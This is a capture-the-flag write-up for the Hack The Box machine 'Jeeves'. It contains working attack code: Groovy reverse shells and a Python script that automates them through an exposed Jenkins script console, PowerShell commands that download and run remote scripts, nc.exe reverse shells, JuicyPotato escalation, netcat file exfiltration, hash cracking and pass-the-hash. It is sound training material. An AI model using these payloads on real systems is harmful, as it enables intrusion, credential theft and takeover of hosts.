## Default Information
IP Address: 10.10.10.63\
OS: Windows

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.63  jeeves.htb
```
### Masscan
Firstly, we will use rustscan to identify the open ports

```
Open 10.10.10.63:80
Open 10.10.10.63:135
Open 10.10.10.63:445
Open 10.10.10.63:50000
```

### Nmap
We will then use the open ports obtained from rustscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 80 | http | Microsoft IIS httpd 10.0 | Open |
| 135 | msrpc | Microsoft Windows RPC | Open |
| 445 | microsoft-ds | Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) | Open |
| 50000 | http | Jetty 9.4.z-SNAPSHOT | Open |


Looking at our nmap output, we can see that port 445 is open. This means that this machine supports smb services. Apart from that, we notice that port 50000 supports web services and there is a Jetty 9.4.z-SNAPSHOT as its version. We will look into port 50000 in detail later on.

### SMB Enumeration
Let us first try to do a null authentication on port 445 using smbmap. Unfortunately, we are unable to do null authentication on port 445 using smbmap

```
┌──(kali㉿kali)-[~/Desktop/jeeves]
└─$ smbmap -u '' -p '' -H 10.10.10.63 -P 445 2>&1
[!] Authentication error on 10.10.10.63
                                                                                                       
┌──(kali㉿kali)-[~/Desktop/jeeves]
└─$ smbmap -u null -p '' -H 10.10.10.63 -P 445 2>&1
[!] Authentication error on 10.10.10.63
                                                                                                       
┌──(kali㉿kali)-[~/Desktop/jeeves]
└─$ smbmap -u '' -p null -H 10.10.10.63 -P 445 2>&1
[!] Authentication error on 10.10.10.63
                                                                                                       
┌──(kali㉿kali)-[~/Desktop/jeeves]
└─$ smbmap -u null -p null -H 10.10.10.63 -P 445 2>&1
[!] Authentication error on 10.10.10.63
```

### Web Enumeration on port 80
Navigating to http://jeeves.htb:80, we manage to find an ```Ask Jeeves``` site that looks like a search engine. However, we realize that whenever we query anything, we will get redirected to an http://jeeves.htb:80/error.html which is an error page. 

From the error page, we can know that the backend database uses Microsoft SQL Server 2005. However, looking at the page source, we realize that this is not an error page but an image instead.

![Error Page](https://github.com/joelczk/writeups/blob/main/HTB/Images/Jeeves/error.png)

Nevertheless, let us try to use SQL Injection payloads on http://jeeves.htb:80. Unfortunately, we are unable to find any SQL Injection from this site. 

Next, let us look at the gobuster output to find for any potential endpoints that could be exploited. Unfortunately, we are unable to find any interesting endpoints

```
http://10.10.10.63:80/error.html           (Status: 200) [Size: 50]
http://10.10.10.63:80/index.html           (Status: 200) [Size: 503]
```

### Web Enumeration on port 50000
Navigating to http://jeeves.htb:50000, we are given 404 response code as the site could not be found. However, from the error page, we know that the site is powered by Jetty://9.4.z-SNAPSHOT

![Jetty error](https://github.com/joelczk/writeups/blob/main/HTB/Images/Jeeves/jetty.png)

Looking up searchsploit for potential exploits, we are able to find a possible directory traversal vulnerability. 

```
┌──(kali㉿kali)-[~]
└─$ searchsploit jetty    
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
Jetty 3.1.6/3.1.7/4.1 Servlet Engine - Arbitrary Command Execution   | cgi/webapps/21895.txt
Jetty 4.1 Servlet Engine - Cross-Site Scripting                      | jsp/webapps/21875.txt
Jetty 6.1.x - JSP Snoop Page Multiple Cross-Site Scripting Vulnerabi | jsp/webapps/33564.txt
jetty 6.x < 7.x - Cross-Site Scripting / Information Disclosure / In | jsp/webapps/9887.txt
Jetty Web Server - Directory Traversal                               | windows/remote/36318.txt
Mortbay Jetty 7.0.0-pre5 Dispatcher Servlet - Denial of Service      | multiple/dos/8646.php
--------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Unfortunately, we are unable to exploit the directory traversal as the site returns a 404 status code for the vulnerable endpoint
![Directory traversal](https://github.com/joelczk/writeups/blob/main/HTB/Images/Jeeves/directory_traversal.png)

Looking at the output from our Gobuster enumeration, we are able to find an ```askjeeves``` endpoint. 

```
http://10.10.10.63:50000/askjeeves            (Status: 302) [Size: 0] [--> http://10.10.10.63:50000/askjeeves/]
```

Navigating to http://jeeves.htb:50000/askjeeves, this redirects us to a Jenkins dashboard.

![askjeeves](https://github.com/joelczk/writeups/blob/main/HTB/Images/Jeeves/askjeeves.png)

## Exploit
### RCE on Jenkins
Navigating to http://jeeves.htb:50000/askjeeves/manage, we can find a ```Script Console``` option that allows us to write Groovy script to execute code on the Jenkins server.

![Script Console](https://github.com/joelczk/writeups/blob/main/HTB/Images/Jeeves/scriptconsole.png)

Let us try to first execute a ```whoami``` command on http://jeeves.htb:50000/askjeeves/script using the Groovy script below:

```
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

From the output,  we can see that it returns the output of the ```whoami``` command.
![whoami command](https://github.com/joelczk/writeups/blob/main/HTB/Images/Jeeves/whoami.png)

Next, we will use the Groovy script console to upload nc.exe onto the temp directory, ```%userprofile\\AppData\\Local\\Temp``` and use the nc.exe to execute a reverse shell connection to our listening port. However, it seems that we are unable to obtain a reverse shell connection using this method.

```
def cmd = "powershell.exe -command iwr -Uri http://10.10.16.6:3000/nc.exe -Outfile %userprofile%\\AppData\\Local\\Temp".execute();
def cmd1 = "%userprofile%\\AppData\\Local\\Temp\\nc.exe -e cmd.exe 10.10.16.6 4000"
println("${cmd.text}");
```

Let us try to use Groovy script to create a reverse shell connection instead. This time we are able to obtain a reverse shell connection to our listening port

```
String host="10.10.16.6";
int port=4000;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

### Obtaining user flag

```
C:\Users\kohsuke\Desktop>type user.txt
type user.txt
<Redacted user flag>
```
### Obtaining password hash
Looking at C:\Users\Administrator\.jenkins\config.xml, we are able to find an encrypted password hash

```
<hudson.security.HudsonPrivateSecurityRealm_-Details>
<passwordHash>
#jbcrypt:$2a$10$QyIjgAFa7r3x8IMyqkeCluCB7ddvbR7wUn1GmFJNO2jQp2k8roehO
</passwordHash>
</hudson.security.HudsonPrivateSecurityRealm_-Details
```

Next, we will try to decrypt the password hash. First of all, we will have to transfer C:\Users\Administrator\.jenkins\secrets\master.key and C:\Users\Administrator\.jenkins\secrets\hudson.util.Secret to our local machine. Afterwards, we will use the jenkins_offline_decrypt.py script from [here](https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py) to decrypt the password hash.

```
┌──(HTB)─(kali㉿kali)-[~/Desktop/jeeves]
└─$ python3 jenkins_offline_decrypt.py master.key hudson.util.Secret config.xml
b979d8dc2568628f73c75157a2fec5ee
```

Afterwards, we will navigate to http://jeeves.htb:50000/askjeeves/asynchPeople/ to obtain the list of users
![Obtaining list of users](https://github.com/joelczk/writeups/blob/main/HTB/Images/Jeeves/users.png)

Afterwards, we will use the hash that we have obtained earlier and attempt to authenticate to the web interface of Jenkins using the list of users that we have found. Unfortunately, we are unable to authenticate to the web interface of Jenkins.

Next, let us try to use crackmapexec to check if any of the users can authenticate to the smb server using the credential. Unfortunately, none of the users are able to authenticate to the smb server

```
┌──(kali㉿kali)-[~/Desktop/jeeves]
└─$ crackmapexec smb 10.10.10.63 -u users.txt -p 'b979d8dc2568628f73c75157a2fec5ee'
SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\anonymous:b979d8dc2568628f73c75157a2fec5ee STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\admin:b979d8dc2568628f73c75157a2fec5ee STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\MANAGE_DOMAINS:b979d8dc2568628f73c75157a2fec5ee STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Administrator:b979d8dc2568628f73c75157a2fec5ee STATUS_LOGON_FAILURE 
SMB         10.10.10.63     445    JEEVES           [-] Jeeves\kohsuke:b979d8dc2568628f73c75157a2fec5ee STATUS_LOGON_FAILURE
```
### Privilege Escalation to root
Looking at the ```whoami \priv``` command, we realized that the SeImpersonatePrivilege is enabled. This means that we could potentially used the Juicy Potato exploit.

```
C:\temp>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

Before we being, let us check the system information using the ```systeminfo``` command to check if the version of Windows that we are using could be exploited using Juciy potato. From the output of the ```systeminfo``` command, we can see that we are using Windows 10 Professional which is vulnerable to the Juicy Potato exploit. 

```
C:\temp>systeminfo
systeminfo

Host Name:                 JEEVES
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.10586 N/A Build 10586
```

Afterwards, we will transfer the nc.exe, and the juicy potato exploit to our C:\temp directory. Afterwards, we can use the JuicyPotato executable to create a reverse shell connection (NOTE: we may have to trial and error with the list of CLSIDs to obtain the correct CLSID to use)

```
jp.exe -l 1337 -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}" -p "c:\windows\system32\cmd.exe" -a "/c C:\temp\nc.exe -e cmd.exe 10.10.16.6 2000" -t *
```

### Obtaining root flag
Navigating to C:\Users\Administrator\Desktop, we realize that there is no root.txt file. Instead, we can only find the hm.txt file. Looking into the contents of the hm.txt file, we get the hint that the flag might be elsewhere

```
C:\Users\Administrator\Desktop>type hm.txt
type hm.txt
The flag is elsewhere.  Look deeper.
```

This might be a case of hidden files in the directory. To find the hidden file, we will use the ```dir /R``` command to look for potentially hidden files. From the output,  we can see that there is a root.txt file that is hidden inside the hm.txt file. 

```
C:\Users\Administrator\Desktop>dir /R
dir /R
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   7,455,174,656 bytes free
```

Referencing the blog from [here](https://davidhamann.de/2019/02/23/hidden-in-plain-sight-alternate-data-streams/) and the hacktricks tutorial from [here](https://book.hacktricks.xyz/windows-hardening/basic-cmd-for-pentesters#alternate-data-streams-cheatsheet-ads-alternate-data-stream), we can know that this is a typical form of Alternate Data Streams and we can extract the root.txt file using the ```more``` command.

```
C:\Users\Administrator\Desktop>more < hm.txt:root.txt
more < hm.txt:root.txt
<Redacted root flag>
```
## Post-Exploitation
### Alternative way of reverse shell using Groovy script

An alternative way that we can create a reverse shell command would be to use the Invoke-PowerShellTcp.ps1 script. We can host the Invoke-PowerShellTcp.ps1 script on our local machine and use the Groovy script to upload the ps1 script to the server and create a reverse shell connection to our listening port on our local machine. 

```
def cmd = """ powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.16.6:3000/Invoke-PowerShellTcp.ps1') """.execute()
println("${cmd.text}");
```

### Reverse Shell Script
We have also wriitten a python3 reverse shell script for automating the reverse shell connection

```python
import requests
import argparse

def checkrce(url):
    url = url + "/script"
    r = requests.get(url)
    if r.status_code == 200:
        return True
    else:
        return False

def reverseshell(url, ip, port, crumbs):
    url = url + "/script"
    script_payload ='String host="str_ip_address";int port=str_port;String os="cmd.exe";Process p=new ProcessBuilder(os).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();'.replace("str_ip_address", str(ip)).replace("str_port", str(port))
    print("[+] Reverse Shell payload used: {payload}".format(payload=script_payload))
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = {
        "script": script_payload,
        "Jenkins-Crumb": crumbs,
        "Submit": "Run"
    }
    r = requests.post(url, data=data, headers=headers, timeout=10)
    
def main(url, ip, port, crumbs):
    if checkrce(url) == True:
        print("[+] Spawning reverse shell connection on {ip}:{port}".format(ip=ip, port=port))
        try:
            reverseshell(url, ip, port, crumbs)
        except:
            pass
    else:
        print("[!] {url} cannot be exploited".format(url=url))

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', help="Vulnerable URL")
    parser.add_argument('-c', '--crumb', help="String value of Jenkins-Crumb")
    parser.add_argument('-i','--ip', help="IP Address of listening connection/lhost")
    parser.add_argument('-p','--port', help="Port Number of listening connection/lport")
    args=parser.parse_args()
    main(args.url, str(args.ip), str(args.port), args.crumb)
```

Executing the following command will create a reverse shell connection to our local machine

```bash
python3 jenkins_reverse.py -u "http://jeeves.htb:50000/askjeeves" -c "9f3ab776a72cd71c3f2923a902f8df3a" -i "10.10.16.6" -p "4000"
```
### Jenkins CLI
Navigating to http://jeeves.htb:50000/askjeeves/cli/, we are able to download the CLI and interact with the Jenkins service. For example, we can use the CLI to check the Jenkins version that is being used. From the output, we can see that the version being used is 2.87

```
┌──(kali㉿kali)-[~/Desktop/jeeves]
└─$ java -jar jenkins-cli.jar -s http://jeeves.htb:50000/askjeeves/ version
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
2.87
```

Using the CLI, we can also see that we are currently authenticated as anonymous

```
┌──(kali㉿kali)-[~/Desktop/jeeves]
└─$ java -jar jenkins-cli.jar -s http://jeeves.htb:50000/askjeeves/ who-am-i                       2 ⨯
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Authenticated as: anonymous
Authorities:
```

According to the documentation, we can also use a Groovy shell to execute remote commands. However, I was unable to get it to work on my local machine as it always hangs whenever I try to execute commands on it

```
┌──(kali㉿kali)-[~/Desktop/jeeves]
└─$ java -jar jenkins-cli.jar -s http://jeeves.htb:50000/askjeeves/ groovysh                       5 ⨯
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Groovy Shell (2.4.11, JVM: 1.8.0_151)
Type ':help' or ':h' for help.
-------------------------------------------------------------------------------
groovy:000> import jenkins.model.Jenkins



```
### Exploiting modifiable service files

Looking at the output of PowerUp.ps1 script, we realize that we might be able to exploit a modifiable service binary. 
```
ServiceName                     : jenkins
Path                            : "C:\Users\Administrator\.jenkins\jenkins.exe"
ModifiableFile                  : C:\Users\Administrator\.jenkins\jenkins.exe
ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
ModifiableFileIdentityReference : JEEVES\kohsuke
StartName                       : .\kohsuke
AbuseFunction                   : Install-ServiceBinary -Name 'jenkins'
CanRestart                      : False
Name                            : jenkins
Check                           : Modifiable Service Files
```
However, executing the ```Install-ServiceBinary``` command, we realize that the jeeves\kohsuke might not have the required privileges to modify the service binary.

```
C:\temp>powershell.exe -c IEX(New-Object Net.WebClient).downloadString('http://10.10.16.6:3000/PowerUp.ps1');Install-ServiceBinary -Name 'Jenkins' -Command 'whoami'
powershell.exe -c IEX(New-Object Net.WebClient).downloadString('http://10.10.16.6:3000/PowerUp.ps1');Install-ServiceBinary -Name 'Jenkins' -Command 'whoami'
Service binary '"C:\Users\Administrator\.jenkins\jenkins.exe"' for service jenkins not modifiable by the current user.
At line:2845 char:13
+             throw "Service binary '$($ServiceDetails.PathName)' for s ...
+             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OperationStopped: (Service binary ...e current user.:String) [], RuntimeException
    + FullyQualifiedErrorId : Service binary '"C:\Users\Administrator\.jenkins\jenkins.exe"' for service jenkins not m 
   odifiable by the current user.
```

### Alternate way of Privilege Escalation using kdbx files
Enumerating the directories, we are able to find a CEH.kdbx file in the C:\Users\kohsuke\Documents directory. With some research, we realize that this is a KeePass database file and might contain database information.

```
C:\Users\kohsuke\Documents>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of C:\Users\kohsuke\Documents

11/03/2017  11:18 PM    <DIR>          .
11/03/2017  11:18 PM    <DIR>          ..
09/18/2017  01:43 PM             2,846 CEH.kdbx
               1 File(s)          2,846 bytes
               2 Dir(s)   7,453,028,352 bytes free
```

First what we have to do is to transfer the CEH.kdbx file to our local machine. 

```
C:\Users\kohsuke\Documents>C:\temp\nc.exe 10.10.16.6 2000 < C:\Users\kohsuke\Documents\CEH.kdbx
C:\temp\nc.exe 10.10.16.6 2000 < C:\Users\kohsuke\Documents\CEH.kdbx
------------------------------------------------------------------------------------------------
┌──(kali㉿kali)-[~/Desktop/jeeves]
└─$ nc -nlvp 2000
listening on [any] 2000 ...
```

Next, we will have to use keepass2john to convert the CEH.kdbx into a hash format that can be cracked using hashcat

```
┌──(kali㉿kali)-[~/Desktop/jeeves]
└─$ keepass2john CEH.kdbx > ceh.txt 
```

However, the hash format that we have obtained cannot be used by hashcat yet. We will need to trim the ```CEH:``` away for the hash to be used by hashcat.

```
┌──(kali㉿kali)-[~/Desktop/jeeves]
└─$ cat ceh.txt   
CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48

┌──(kali㉿kali)-[~/Desktop/jeeves]
└─$ cat ceh_hashcat.txt
$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
```

Finally, we will then use hashcat to obtain the password for the database file. From the output, we can find out that the password is ```moonshine1```

```
┌──(kali㉿kali)-[~/Desktop/jeeves]
└─$ hashcat -m 13400 ceh_hashcat.txt /home/kali/Desktop/pentest/wordlist/rockyou.txt
$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48:moonshine1
```

Next, we will download keepasx to be able to use KeePassX to view the database file. 

```
sudo apt-get install keepassx
```

Afterwards, we will open the CEH.kdbx file using KeePassX and authenticate using the credentials that we have found earlier. Looking at the entry for ```Backup Stuff```, we are able to find a hash. 
![Hash from Backup Stuff](https://github.com/joelczk/writeups/blob/main/HTB/Images/Jeeves/backup.png)

Using the hash, we will try to do a pass-the-hash attack and see if we can authenticate to the windows server.

```
┌──(kali㉿kali)-[~/Desktop/jeeves]
└─$ impacket-smbexec -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 jeeves/Administrator@10.10.10.63
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system
```

Apart from that, we can also use ```impacket-psexec``` to carry out the pass the hash attack. Unfortuantely, executing Pass-The-Hash attack using ```impacket-wmiexec``` times out and we are unable to exploit using ```impacket-wmiexec```

```
┌──(kali㉿kali)-[~]
└─$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 jeeves/Administrator@10.10.10.63

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.63.....
[*] Found writable share ADMIN$
[*] Uploading file eXxiUsJL.exe
[*] Opening SVCManager on 10.10.10.63.....
[*] Creating service GNQW on 10.10.10.63.....
[*] Starting service GNQW.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```
